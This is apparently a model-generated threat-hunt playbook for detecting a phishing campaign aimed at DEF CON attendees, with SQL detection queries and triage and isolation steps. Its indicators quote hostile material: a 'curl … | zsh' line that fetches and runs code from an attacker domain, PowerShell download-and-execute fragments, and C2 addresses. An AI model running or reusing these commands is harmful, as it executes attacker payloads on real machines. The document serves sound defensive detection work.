---
analysis: A simple detection rule for the specific plist name is easily bypassed by
  renaming. This hunt correlates script execution logic (which is harder to change
  than a file name) with rare file creation and known C2 infrastructure across two
  operating systems simultaneously.
blind_spots:
- id: script-logging-disabled
  owner: Endpoint Engineering
  question: Was the PowerShell loader executed but not captured in the logs?
  remediation: Enable PowerShell Script Block Logging via GPO across the fleet.
  requires: hb_script_activity (PowerShell Event ID 4104)
  risk: A host with script block logging disabled will not report the 'iex' logic,
    leaving only file or network artifacts to find.
  stage: windows-powershell-loader
- id: macos-tcc-blind-spot
  owner: Security Operations
  question: Did the AMOS stealer successfully access the Notes.app database?
  remediation: Implement monitoring for TCC permission requests and data access to
    sensitive paths like ~/Library/Notes.
  requires: Unified Audit Logs / TCC access logs
  risk: We can see the malware install persistence, but we cannot confirm data theft
    from TCC-protected apps without specific OS-level auditing.
  stage: macos-persistence-launchdaemon
coverage:
- stage: windows-powershell-loader
  status: covered
  steps:
  - windows-powershell-loader-activity
  - rare-file-corroboration
  - c2-network-correlation
- stage: macos-persistence-launchdaemon
  status: covered
  steps:
  - macos-persistence-activity
  - rare-file-corroboration
  - c2-network-correlation
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: social-engineering-outreach
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: google-doc-apps-script-interaction
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-payload-execution
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: windows-clickonce-delivery
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: amos-data-collection
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: c2-traffic-polling
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Protecting employees from post-conference targeted phishing that
    delivers stealer malware and remote access tools is a high-priority obligation.
  methodology: model-assisted
  trigger: intel-report
hypothesis: Adversaries are targeting conference attendees with malicious documents
  that execute PowerShell loaders to temp directories on Windows or install LaunchDaemon
  persistence on macOS.
labels:
- hunt
- attack.t1059.001
- attack.t1543.001
name: 'Post-DEF CON Phishing: PS Loader and macOS Persistence'
parameters:
  c2_ips:
    default:
    - 86.54.25.213
    - 192.253.248.181
    description: C2 IP addresses for AMOS and associated loaders.
    from:
      kind: article
      observed: '2026-08-19'
      ref: huntress-defcon-phishing
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-08-19'
      ref: standard-lookback
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Focus on high-value targets (executives, marketing) who are most likely
  to be targeted by conference-themed lures. Limit the scope to Windows and macOS
  workstations.
references:
- name: "Huntress \u2014 Post-DEF CON Phishing Uses Malicious Google Doc to Deliver\
    \ Malware"
  url: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
related:
- hunt: social-engineering-outreach-analysis
  reason: Initial phishing outreach occurs via X (Twitter) DMs, which requires non-endpoint
    telemetry not available here.
  relation: out-of-scope-alternative
- hunt: web-based-delivery-lure-interaction
  relation: follows
scenario:
  stages:
  - name: Social Engineering via X DM
    observables:
    - X account @HartmansDoeke
    - Direct messages regarding conference planning
    - Links to Google Docs with custom access keys
    slug: social-engineering-outreach
    tactic: initial-access
    techniques:
    - T1566.003
  - name: Malicious Google Doc Sidebar
    observables:
    - DecryptPanel.html
    - Google Apps Script sidebar
    - Fake decryption failure prompts
    slug: google-doc-apps-script-interaction
    tactic: execution
    techniques:
    - T1059.007
  - name: macOS Script and DMG Execution
    observables:
    - curl -fsSL https://apple-googleapi.com/i | zsh
    - GAPIUpdate.dmg
    - apple-googleapi.com
    - gapiupdate.dmg
    - Bypassing macOS Gatekeeper via user instructions
    slug: macos-payload-execution
    tactic: execution
    techniques:
    - T1059.004
    - T1204.002
    - T1553.001
  - name: Windows ClickOnce Installer
    observables:
    - GapiUpdate.application
    - https://gapidriver.com/installer/GapiUpdate.application
    - gapidriver.com
    - Certificate issued to BARNEHAGEN GUNHILDS MINNE AS
    slug: windows-clickonce-delivery
    tactic: execution
    techniques:
    - T1204.002
    - T1218
  - name: Windows PowerShell Loader
    observables:
    - https://1foqo.lat/core4
    - '%TEMP%\sys.ps1'
    - Import-Module BitsTransfer
    - Invoke-WebRequest -OutFile $t -UseBasicParsing
    - Invoke-Expression (gc $t -Raw)
    slug: windows-powershell-loader
    tactic: execution
    techniques:
    - T1059.001
  - name: macOS LaunchDaemon Persistence
    observables:
    - /Library/LaunchDaemons/com.xdivcmp.plist
    - launchctl bootstrap
    - com.xdivcmp.plist
    slug: macos-persistence-launchdaemon
    tactic: persistence
    techniques:
    - T1543.001
  - name: AMOS Data Staging and Collection
    observables:
    - /tmp/lksopo
    - Notes.app database access
    - ~/.pwd (stolen user password file)
    - ~/.phost
    - ~/.bhost
    slug: amos-data-collection
    tactic: collection
    techniques:
    - T1005
    - T1555
    - T1119
  - name: C2 Communication and Polling
    observables:
    - 86.54.25.213
    - 192.253.248.181
    - http://86.54.25.213/log
    - /api/v1/bot/actions/
    - res10.php
    - res11.php
    - res12.php
    slug: c2-traffic-polling
    tactic: command-and-control
    techniques:
    - T1071.001
  summary: Threat actors use social engineering on X (Twitter) to lure targets into
    a malicious Google Doc featuring an Apps Script sidebar. This sidebar delivers
    OS-specific payloads, including AMOS stealer for macOS and NetSupport RAT for
    Windows, utilizing ClickFix-style prompts and fake installers to achieve persistence
    and data exfiltration.
series:
  index: 2
  slug: post-def-con-phishing-uses-malicious-google-doc-to-deliver-malware
  title: Post-DEF CON Phishing Uses Malicious Google Doc to Deliver Malware
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Post-DEF CON Phishing: PS Loader and macOS Persistence

This hunt focuses on the dual-platform execution and persistence mechanisms observed in the August 2026 phishing campaign targeting DEF CON attendees. On Windows, the attack uses a ClickFix-style lure to trick users into running a PowerShell command that downloads a loader to the %TEMP% directory. On macOS, the AMOS stealer establishes a persistent backdoor using a LaunchDaemon plist (/Library/LaunchDaemons/com.xdivcmp.plist). The hunt uses script block logging to catch the PowerShell 'iex' pattern and scheduled job snapshots to identify the malicious launchd entry.

## windows-powershell-loader-activity
<!-- Windows PowerShell Loader Activity -->
Identify the PowerShell execution pattern where a script is downloaded to the TEMP folder and immediately executed via 'iex'.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: A script block reflecting the report's loader logic. Silence means no such
  patterns were captured in script logs.
reads:
- device_hostname
- actor_user_name
- script_content
- time
- script_type
silence: not_evidence_of_absence
source: hb_script_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, actor_user_name, script_content, time FROM hb_script_activity WHERE script_type = 'PowerShell' AND (LOWER(script_content) LIKE '%bitstransfer%' OR LOWER(script_content) LIKE '%invoke-webrequest%') AND LOWER(script_content) LIKE '%\sys.ps1%' AND LOWER(script_content) LIKE '%iex%' AND time >= datetime('now', '-{{lookback_days}} days')
```

## parallel-gathering
<!-- Gather Multi-Platform Evidence -->
parallel:
- → macos-persistence-activity
- → rare-file-corroboration
- → c2-network-correlation
join: → triage-agent

## macos-persistence-activity
<!-- macOS LaunchDaemon Persistence -->
Find the specific LaunchDaemon persistence entry used by the AMOS malware on macOS.

```sqlite target=endpoint role=triage params=(lookback_days=lookback_days)
~~~yaml
expected: Rows containing the AMOS plist name. Silence in a snapshot implies the job
  is not present on the fleet.
reads:
- device_hostname
- job_name
- job_definition_path
- job_cmd_line
- time
silence: evidence_of_absence
source: hb_scheduled_job
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, job_name, job_definition_path, job_cmd_line, time FROM hb_scheduled_job WHERE (LOWER(job_name) = 'com.xdivcmp.plist' OR LOWER(job_definition_path) LIKE '%/library/launchdaemons/com.xdivcmp.plist%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## rare-file-corroboration
<!-- Rare File Corroboration -->
Stack-count files in sensitive paths (TEMP, LaunchDaemons) to find rare payloads associated with the loaders.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A list of files seen on very few hosts. Silence means no matching files
  were recorded in those specific paths.
prevalence:
  by: device_hostname
  key:
  - file_name
  - file_path
  rare_below: 3
reads:
- file_name
- file_path
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT file_name, file_path, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_file_activity WHERE (LOWER(file_path) LIKE '%\temp\sys.ps1' OR LOWER(file_path) LIKE '%/library/launchdaemons/%') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY file_name, file_path HAVING host_count <= 3
```

## c2-network-correlation
<!-- C2 Network Correlation -->
Confirm if any host is communicating with the known malicious IP addresses mentioned in the report.

```sqlite target=network role=enrichment params=(c2_ips=c2_ips, lookback_days=lookback_days)
~~~yaml
expected: Network connections to the known C2 IPs. Silence means no such traffic was
  logged.
reads:
- device_hostname
- process_name
- dst_endpoint_ip
- dst_endpoint_port
- direction
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-08'
~~~
SELECT device_hostname, process_name, dst_endpoint_ip, dst_endpoint_port, direction, time FROM hb_network_connection WHERE (instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-agent
<!-- Triage Malicious Activity -->
```agent target=hunter
cite: required
context:
- windows-powershell-loader-activity
- macos-persistence-activity
- rare-file-corroboration
- c2-network-correlation
max_iterations: 3
objective: Determine if any host has successfully executed the PowerShell loader or
  established LaunchDaemon persistence based on the gathered telemetry.
success_criteria: A clear per-host verdict citing specific rows from the query results.
tools:
- endpoint
- network
```

## route-on-verdict
<!-- Route on Verdict -->
if~: "The triage verdict is 'malicious' for at least one host." (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: script-logging-disabled)
else: → close-out

## isolate-host
<!-- Isolate Affected Host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately. For macOS, remove the LaunchDaemon plist /Library/LaunchDaemons/com.xdivcmp.plist. For Windows, investigate and clean the %TEMP% directory.
```
→ analyst-review

## analyst-review
<!-- Analyst Review -->
```manual target=analyst
Review the cited rows from the triage step. Confirm if the activity aligns with known phishing lures. Document any false positives for tuning.
```
→ end

## close-out
<!-- Close Out -->
```manual target=analyst
No malicious activity found. Document the search parameters and the coverage window.
```
→ end
